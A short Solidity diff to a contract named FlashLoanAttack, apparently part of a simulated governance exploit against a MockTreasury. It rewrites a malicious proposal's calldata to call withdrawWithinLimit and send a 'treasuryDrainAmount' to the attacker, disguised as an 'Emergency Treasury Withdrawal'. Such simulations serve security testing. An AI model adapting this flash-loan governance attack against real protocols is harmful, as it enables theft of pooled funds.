@@ -180,10 +180,13 @@ contract FlashLoanAttack is IFlashLoanReceiver {
         values[0] = 0;
 
         bytes[] memory calldatas = new bytes[](1);
-        // calldata for a simple transfer or withdrawal function
-        // For this generic attack, we assume a transfer() function signature
-        // In reality, we'd target specific treasury functions
-        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", address(this), treasuryDrainAmount);
+        // calldata for a simple withdrawal function on the treasury
+        // Here we target a real MockTreasury method to transfer funds to this contract
+        calldatas[0] = abi.encodeWithSignature(
+            "withdrawWithinLimit(address,uint256)",
+            address(this),
+            treasuryDrainAmount
+        );
 
         string memory description = "PROPOSAL: Emergency Treasury Withdrawal";
         bytes32 descriptionHash = _hashDescription(description);
